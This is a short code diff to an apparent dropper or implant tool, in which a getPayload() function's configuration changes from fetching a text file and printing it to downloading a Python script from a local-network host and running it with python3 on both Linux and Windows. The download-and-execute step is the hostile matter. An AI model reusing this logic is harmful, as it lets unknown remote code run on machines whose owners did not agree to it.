@@ -12,15 +12,15 @@ def getPayload():
         return {
             "installPath": "/tmp",
             "payload": "ciao.txt",
-            "download": "http://[CS20]:8080/ciao.txt",
-            "execCommand": "cat ciao.txt",
+            "download": "http://192.168.1.21:8081/ciao.py",
+            "execCommand": "python3 ciao.py",
         }
     else:
         return {
             "installPath": "C:\\Program Files\\Bedbug",
-            "payload": "C:\\tmp\\ciao.txt",
-            "download": "http://[CS20]:8080/ciao.txt",
-            "execCommand": "C:\\tmp\\ciao.txt",
+            "payload": "C:\\tmp\\ciao.py",
+            "download": "http://192.168.1.21:8081/ciao.py",
+            "execCommand": "python3 C:\\tmp\\ciao.py",
         }
     return print("Payload not found")
 
